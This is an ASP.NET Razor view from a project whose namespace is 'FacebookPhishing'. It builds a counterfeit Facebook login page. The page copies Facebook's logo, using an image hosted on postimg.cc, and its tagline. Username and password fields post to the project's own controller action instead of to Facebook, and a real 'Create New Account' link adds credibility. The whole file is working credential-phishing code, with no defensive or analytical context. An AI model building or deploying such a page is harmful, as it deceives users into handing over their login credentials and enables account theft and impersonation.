@model FacebookPhishing.Domain.User


@{
    ViewData["Title"] = "Facebook";
}
<!DOCTYPE html>
<html lang="en">
<head>
    <link rel="stylesheet" href="~/css/facebook.css">
</head>
<body>
    @using (Html.BeginForm("Facebook", "Home", FormMethod.Post))
    {
<div class="box">
    <div class="title-box">
        <img src="https://i.postimg.cc/NMyj90t9/logo.png" alt="Facebook"><br>
        <p>Facebook helps you connect and share with the people in your life.</p>
    </div>
    <div class="form-box">
                @Html.EditorFor(x => x.Username, new { htmlAttributes = new { @class = "form-control", @placeholder = "Email adress or phone number" } })
                @Html.EditorFor(x => x.Password, new { htmlAttributes = new { @class = "form-control", @type = "Password",@placeholder = "Password" } })
                <button type="submit">Log In</button>
        <div class="create-btn">
            <a href="https://www.facebook.com/" target="_blank">Create New Account</a>
        </div>
    </div>
</div>
}
</body>
</html>